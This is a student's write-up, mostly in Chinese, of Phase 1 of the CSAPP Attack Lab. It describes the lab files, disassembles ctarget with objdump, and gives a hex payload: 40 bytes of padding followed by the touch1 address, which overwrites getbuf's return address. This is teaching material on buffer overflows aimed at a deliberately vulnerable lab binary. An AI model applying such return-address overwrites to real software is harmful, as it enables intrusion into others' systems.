## Prepration
实验目的：
1、了解缓冲区溢出（stack discipline）
2、write code away from stack discipline
文件结构：
CSAPP-AttackLab
	AttackLab.md
	target1
		cookie.txt 一个8位16进制数，作为攻击的特殊标志符
		ctarget 代码注入攻击的目标文件
		farm.c 在ROP攻击中作为gadgets产生源
		hex2raw 将16进制数转化为攻击字符
		README.txt
		rtarget ROP攻击的目标文件
实验环境：
Centos8-Linux
# Phase_1

objdump -d ./ctarget>>ctarget.s //反汇编

![[Pasted image 20240620171232.png]]
CI: run getbuf return to touch1 adress, touch1 adress : 0x4017c0
getbuf有40个字节的栈空间，所以注入代码应填为:
phase1_ans.txt:
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	c0 17 40 00 00 00 00 00